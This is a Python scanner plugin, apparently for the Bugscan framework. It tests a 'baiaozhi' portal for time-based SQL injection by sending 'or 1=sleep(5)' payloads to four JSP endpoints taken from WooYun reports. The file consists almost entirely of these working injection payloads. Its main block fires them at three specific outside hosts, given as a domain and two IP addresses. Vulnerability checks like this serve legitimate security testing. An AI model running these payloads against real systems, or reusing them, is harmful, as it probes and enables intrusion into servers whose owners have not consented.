#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = baiaozhi
#_FileName_ = baiaozhi_sqli.py

import time

def assign(service, arg):
    if service == 'baiaozhi':
        return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-0107187
    payload1 = "portal/root/eip_cro/gg_list.jsp?nowlx=a%27%20or%201=sleep%285%29%20and%20%271%27=%271"
    payload2 = "portal/root/eip_cro/gg_list.jsp?nowlx=a%27%20or%201=sleep%280%29%20and%20%271%27=%271"
    t1 = time.time()
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(arg+payload1)
    #No.2 http://www.wooyun.org/bugs/wooyun-2010-0108186
    payload1 = "portal/root/lims_std/gyxt.jsp?id=a'%20or%201=sleep(5)%20and%20'1'='1"
    payload2 = "portal/root/lims_std/gyxt.jsp?id=a'%20or%201=sleep(0)%20and%20'1'='1"
    t1 = time.time()
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(arg+payload1)
    #No.3 http://www.wooyun.org/bugs/wooyun-2010-0107168
    payload1 = "portal/root/lcky1/gg_nr.jsp?id=-1%20or%201=sleep(5)"
    payload2 = "portal/root/lcky1/gg_nr.jsp?id=-1%20or%201=sleep(0)"
    t1 = time.time()
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(arg+payload1)
    #No.4 http://www.wooyun.org/bugs/wooyun-2010-0106048
    payload1 = "portal/root/lims_std/gyxt.jsp?lmbm=abc'%20or%201=sleep(5)%20and%20'1'='1"
    payload2 = "portal/root/lims_std/gyxt.jsp?lmbm=abc'%20or%201=sleep(0)%20and%20'1'='1"
    t1 = time.time()
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2)
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(arg+payload1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('baiaozhi', 'http://gzboji-edc.com/')[1])
    audit(assign('baiaozhi', 'http://202.38.77.223:8000/')[1])
    audit(assign('baiaozhi', 'http://218.75.123.195:8181/')[1])